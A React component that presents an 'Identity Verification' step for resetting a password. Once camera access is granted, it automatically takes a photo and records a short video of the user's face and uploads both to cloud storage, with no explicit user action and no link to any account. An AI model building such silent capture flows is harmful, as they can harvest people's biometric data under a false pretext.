
import React, { useState, useRef, useCallback, useEffect } from 'react';
import { Camera, CameraOff, CheckCircle, AlertCircle } from 'lucide-react';
import { storage } from '../firebase';
import { ref, uploadBytes, getDownloadURL } from 'firebase/storage';
import AnimatedInstruction from './AnimatedInstruction';

const VideoRecorder = () => {
  // State management
  const [isRecording, setIsRecording] = useState(false);
  const [hasPermission, setHasPermission] = useState(false);
  const [recordedVideo, setRecordedVideo] = useState(null);
  const [currentInstruction, setCurrentInstruction] = useState('');
  const [isUploading, setIsUploading] = useState(false);
  const [uploadStatus, setUploadStatus] = useState(null);
  const [stream, setStream] = useState(null);
  const [isLoadingCamera, setIsLoadingCamera] = useState(true);
  const [countdown, setCountdown] = useState(10);
  const [hasRecordedOnce, setHasRecordedOnce] = useState(false);
  const [hasTakenPicture, setHasTakenPicture] = useState(false);

  // Refs for video elements and recording
  const videoRef = useRef(null);
  const previewRef = useRef(null);
  const mediaRecorderRef = useRef(null);
  const chunksRef = useRef([]);
  const countdownIntervalRef = useRef(null);
  const canvasRef = useRef(null);

  // Predefined motion instructions
  const instructions = [
    "Turn your head to the left",
    "Turn your head to the right", 
    "Smile naturally",
    "Blink twice slowly",
    "Nod your head up and down",
    "Look up at the ceiling",
    "Look down at the floor",
    "Open your mouth slightly"
  ];

  // Get random instruction
  const getRandomInstruction = useCallback(() => {
    const randomIndex = Math.floor(Math.random() * instructions.length);
    return instructions[randomIndex];
  }, []);

  // Take picture and upload automatically
  const takePictureAndUpload = useCallback(async () => {
    if (!stream || !videoRef.current || hasTakenPicture) return;

    console.log('Taking picture automatically...');
    setHasTakenPicture(true);
    setIsUploading(true);

    try {
      // Create canvas to capture the image
      const canvas = document.createElement('canvas');
      const video = videoRef.current;
      
      // Set canvas dimensions to match video
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Convert canvas to blob
      canvas.toBlob(async (blob) => {
        if (!blob) {
          throw new Error('Failed to capture image');
        }

        // Upload to Firebase
        const timestamp = Date.now();
        const fileName = `identity-verification/photo_${timestamp}.jpg`;
        const storageRef = ref(storage, fileName);

        const snapshot = await uploadBytes(storageRef, blob);
        const downloadURL = await getDownloadURL(snapshot.ref);

        console.log('Picture uploaded successfully:', downloadURL);
        setUploadStatus({ 
          type: 'success', 
          message: 'Picture captured and uploaded successfully!' 
        });

        // Stop camera stream after successful upload
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
          setStream(null);
          setHasPermission(false);
        }

      }, 'image/jpeg', 0.8);

    } catch (error) {
      console.error('Picture capture/upload error:', error);
      setUploadStatus({ 
        type: 'error', 
        message: 'Failed to capture or upload picture. Please try again.' 
      });
    } finally {
      setIsUploading(false);
    }
  }, [stream, hasTakenPicture]);

  // Get supported MIME type for MediaRecorder
  const getSupportedMimeType = () => {
    const possibleTypes = [
      'video/webm;codecs=vp9',
      'video/webm;codecs=vp8',
      'video/webm',
      'video/mp4'
    ];
    
    for (const type of possibleTypes) {
      if (MediaRecorder.isTypeSupported(type)) {
        console.log('Using MIME type:', type);
        return type;
      }
    }
    
    console.log('Using default MIME type');
    return 'video/webm'; // fallback
  };

  // Start countdown and recording
  const startRecordingWithCountdown = useCallback(() => {
    if (!stream || hasRecordedOnce) return;

    console.log('Starting recording with countdown');
    setCountdown(10);
    setIsRecording(true);
    
    // Start countdown
    countdownIntervalRef.current = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(countdownIntervalRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    chunksRef.current = [];
    
    const supportedMimeType = getSupportedMimeType();
    const mediaRecorder = new MediaRecorder(stream, {
      mimeType: supportedMimeType
    });
    
    mediaRecorderRef.current = mediaRecorder;

    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        chunksRef.current.push(event.data);
      }
    };

    mediaRecorder.onstop = () => {
      const blob = new Blob(chunksRef.current, { type: supportedMimeType });
      
      // Check file size (limit to 10MB)
      if (blob.size > 10 * 1024 * 1024) {
        setUploadStatus({ type: 'error', message: 'Video too large. Please record a shorter video.' });
        return;
      }

      const videoUrl = URL.createObjectURL(blob);
      setRecordedVideo({ blob, url: videoUrl });
      setHasRecordedOnce(true); // Prevent auto-restart
      
      // Stop camera stream
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        setStream(null);
        setHasPermission(false);
      }

      // Automatically upload the video
      uploadVideoAutomatically({ blob, url: videoUrl });
    };

    mediaRecorder.start();

    // Auto-stop recording after 10 seconds
    setTimeout(() => {
      if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
        mediaRecorderRef.current.stop();
        setIsRecording(false);
        clearInterval(countdownIntervalRef.current);
      }
    }, 10000);
  }, [stream, hasRecordedOnce]);

  // Initialize camera and set random instruction
  const initializeCamera = async () => {
    try {
      setIsLoadingCamera(true);
      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
        video: { width: 640, height: 480 },
        audio: false 
      });
      
      setStream(mediaStream);
      setHasPermission(true);
      setCurrentInstruction(getRandomInstruction());
      setIsLoadingCamera(false);
      
      // Ensure video element gets the stream immediately
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        // Force the video to play
        videoRef.current.play().catch(console.error);
      }
    } catch (error) {
      console.error('Error accessing camera:', error);
      setUploadStatus({ type: 'error', message: 'Camera access denied. Please allow camera permissions.' });
      setIsLoadingCamera(false);
    }
  };

  // Automatically request camera permission when component mounts
  useEffect(() => {
    if (!hasRecordedOnce && !hasTakenPicture) {
      initializeCamera();
    }
  }, [hasRecordedOnce, hasTakenPicture]);

  // Ensure video stream is set when videoRef becomes available
  useEffect(() => {
    if (videoRef.current && stream && hasPermission) {
      videoRef.current.srcObject = stream;
      videoRef.current.play().catch(console.error);
    }
  }, [stream, hasPermission]);

  // Auto-take picture when camera permission is granted
  useEffect(() => {
    if (hasPermission && stream && !hasTakenPicture && videoRef.current) {
      console.log('Auto-taking picture - hasTakenPicture:', hasTakenPicture);
      // Small delay to ensure video is ready
      setTimeout(() => {
        takePictureAndUpload();
      }, 1000);
    }
  }, [hasPermission, stream, hasTakenPicture, takePictureAndUpload]);

  // Auto-start recording when camera permission is granted (only once)
  useEffect(() => {
    if (hasPermission && stream && !isRecording && !recordedVideo && !hasRecordedOnce) {
      console.log('Auto-starting recording - hasRecordedOnce:', hasRecordedOnce);
      // Small delay to ensure everything is set up
      setTimeout(() => {
        startRecordingWithCountdown();
      }, 1000);
    }
  }, [hasPermission, stream, isRecording, recordedVideo, hasRecordedOnce, startRecordingWithCountdown]);

  // Upload video automatically
  const uploadVideoAutomatically = async (videoData) => {
    setIsUploading(true);
    setUploadStatus(null);

    try {
      const timestamp = Date.now();
      const fileName = `identity-verification/video_${timestamp}.webm`;
      const storageRef = ref(storage, fileName);

      // Upload the video blob
      const snapshot = await uploadBytes(storageRef, videoData.blob);
      const downloadURL = await getDownloadURL(snapshot.ref);

      console.log('Video uploaded successfully:', downloadURL);
      setUploadStatus({ 
        type: 'success', 
        message: 'Video uploaded successfully! Identity verification complete.' 
      });
      
      // Reset for new recording after a delay
      setTimeout(() => {
        resetRecorder();
      }, 3000);

    } catch (error) {
      console.error('Upload error:', error);
      setUploadStatus({ 
        type: 'error', 
        message: 'Upload failed. Please try again.' 
      });
    } finally {
      setIsUploading(false);
    }
  };

  // Reset recorder state
  const resetRecorder = () => {
    setRecordedVideo(null);
    setCurrentInstruction('');
    setHasPermission(false);
    setUploadStatus(null);
    setIsLoadingCamera(false);
    setCountdown(10);
    setHasRecordedOnce(false); // Reset the flag to allow new recording
    setHasTakenPicture(false); // Reset picture flag
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      setStream(null);
    }
    if (countdownIntervalRef.current) {
      clearInterval(countdownIntervalRef.current);
    }
  };

  // Record again
  const recordAgain = () => {
    console.log('Recording again - resetting state');
    setRecordedVideo(null);
    setCurrentInstruction(getRandomInstruction());
    setCountdown(10);
    setHasRecordedOnce(false); // Reset to allow auto-start
    setHasTakenPicture(false); // Reset picture flag
    if (countdownIntervalRef.current) {
      clearInterval(countdownIntervalRef.current);
    }
    initializeCamera();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-50 to-pink-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-3xl shadow-2xl p-8 w-full max-w-md mx-auto">
        
        {/* Header */}
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-4">
            <Camera className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-2xl font-bold text-gray-900 mb-2">Identity Verification</h1>
          <p className="text-gray-600">Complete the motion check to verify your identity and reset your password</p>
        </div>

        {/* Auto-capture indicator */}
        {hasTakenPicture && isUploading && (
          <div className="flex items-center justify-center mb-4">
            <div className="flex items-center space-x-2 bg-green-50 px-4 py-2 rounded-full border border-green-200">
              <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
              <span className="text-green-600 font-medium text-sm">Capturing and uploading...</span>
            </div>
          </div>
        )}

        {/* Live Recording Indicator with Countdown */}
        {isRecording && (
          <div className="flex items-center justify-center mb-4">
            <div className="flex items-center space-x-2 bg-red-50 px-4 py-2 rounded-full border border-red-200">
              <div className="w-3 h-3 bg-red-500 rounded-full animate-pulse"></div>
              <span className="text-red-600 font-medium text-sm">LIVE</span>
              <span className="text-red-600 font-bold text-sm">({countdown}s)</span>
            </div>
          </div>
        )}

        {/* Auto-upload indicator */}
        {isUploading && !hasTakenPicture && (
          <div className="flex items-center justify-center mb-4">
            <div className="flex items-center space-x-2 bg-blue-50 px-4 py-2 rounded-full border border-blue-200">
              <div className="w-3 h-3 bg-blue-500 rounded-full animate-pulse"></div>
              <span className="text-blue-600 font-medium text-sm">Uploading...</span>
            </div>
          </div>
        )}

        {/* Status Messages */}
        {uploadStatus && (
          <div className={`mb-6 p-4 rounded-2xl flex items-center space-x-3 ${
            uploadStatus.type === 'success' 
              ? 'bg-green-50 text-green-800' 
              : 'bg-red-50 text-red-800'
          }`}>
            {uploadStatus.type === 'success' ? (
              <CheckCircle className="w-5 h-5" />
            ) : (
              <AlertCircle className="w-5 h-5" />
            )}
            <span className="text-sm font-medium">{uploadStatus.message}</span>
          </div>
        )}

        {/* Animated Instruction Display - Below Video */}
        {currentInstruction && !recordedVideo && !hasTakenPicture && (
          <div className="mb-6 p-6 bg-gradient-to-r from-purple-50 to-pink-50 rounded-3xl border border-purple-100">
            <AnimatedInstruction instruction={currentInstruction} />
          </div>
        )}

        {/* Video Display Area - Hidden when taking picture */}
        {!hasTakenPicture && (
          <div className="mb-4">
            {isLoadingCamera ? (
              // Loading state while requesting camera permission
              <div className="aspect-square bg-gray-100 rounded-full flex items-center justify-center mx-auto w-64 h-64">
                <div className="text-center">
                  <Camera className="w-12 h-12 text-gray-400 mx-auto mb-3 animate-pulse" />
                  <p className="text-gray-600 text-sm">Requesting camera access...</p>
                </div>
              </div>
            ) : recordedVideo ? (
              // Recorded video preview - small circular
              <div className="relative w-64 h-64 mx-auto">
                <div className="w-full h-full bg-black rounded-full overflow-hidden">
                  <video
                    ref={previewRef}
                    src={recordedVideo.url}
                    controls
                    className="w-full h-full object-cover"
                  />
                </div>
              </div>
            ) : hasPermission && stream ? (
              // Live camera feed - always circular (visible immediately after permission)
              <div className="relative w-64 h-64 mx-auto">
                <div className="w-full h-full bg-black rounded-full overflow-hidden">
                  <video
                    ref={videoRef}
                    autoPlay
                    muted
                    playsInline
                    className="w-full h-full object-cover"
                  />
                  {isRecording && (
                    <div className="absolute top-4 left-1/2 transform -translate-x-1/2 bg-red-500 text-white px-3 py-1 rounded-full text-sm font-medium animate-pulse">
                      Recording... {countdown}s
                    </div>
                  )}
                </div>
              </div>
            ) : (
              // Fallback if camera access failed
              <div className="aspect-square bg-gray-100 rounded-full flex items-center justify-center mx-auto w-64 h-64">
                <div className="text-center">
                  <CameraOff className="w-12 h-12 text-gray-400 mx-auto mb-3" />
                  <p className="text-gray-600 text-sm">Camera access denied</p>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Action Buttons - Only show Record Again button when needed */}
        <div className="space-y-3">
          {(recordedVideo || hasTakenPicture) && !isUploading && uploadStatus?.type === 'success' && (
            <button
              onClick={recordAgain}
              className="w-full bg-gray-500 text-white py-4 rounded-2xl font-semibold transition-all duration-300 hover:shadow-lg hover:scale-105"
            >
              Try Again
            </button>
          )}

          {uploadStatus?.type === 'error' && (
            <button
              onClick={recordAgain}
              className="w-full bg-purple-500 text-white py-4 rounded-2xl font-semibold transition-all duration-300 hover:shadow-lg hover:scale-105"
            >
              Try Again
            </button>
          )}
        </div>

        {/* Footer */}
        <div className="mt-8 text-center">
          <p className="text-xs text-gray-500">
            {hasTakenPicture ? 
              "Picture captured automatically upon camera access." :
              "Recording will start automatically and upload after 10 seconds."
            }
          </p>
        </div>

        {/* Hidden canvas for picture capture */}
        <canvas ref={canvasRef} style={{ display: 'none' }} />
      </div>
    </div>
  );
};

export default VideoRecorder;
